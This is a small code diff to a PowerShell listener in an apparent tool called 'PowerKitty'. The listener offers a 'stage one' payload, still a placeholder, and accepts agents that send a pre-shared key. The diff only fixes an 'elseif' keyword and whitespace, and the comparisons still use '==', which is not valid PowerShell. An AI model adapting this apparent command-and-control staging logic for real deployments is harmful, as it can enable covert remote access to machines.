@@ -78,11 +78,11 @@ Function Global:New-Listerner()
 				{
 					$StreamWriter.WriteLine("Purr! Welcome to stage one, here is your payload: <TODO>") | Out-Null
 				}
-				else if($StreamReader.ReadLine() == "PowerKitty-Agent:$PSK")
+				elseif($StreamReader.ReadLine() == "PowerKitty-Agent:$PSK")
 				{
 					$StreamWriter.WriteLine("Purrrrr! Adding you to connection list! :) ") | Out-Null
 				} 
-				else 
+				else
 				{
 					# this is not a verified powerkitty connection
 					$StreamWriter.WriteLine("HISSS! >.<") | Out-Null
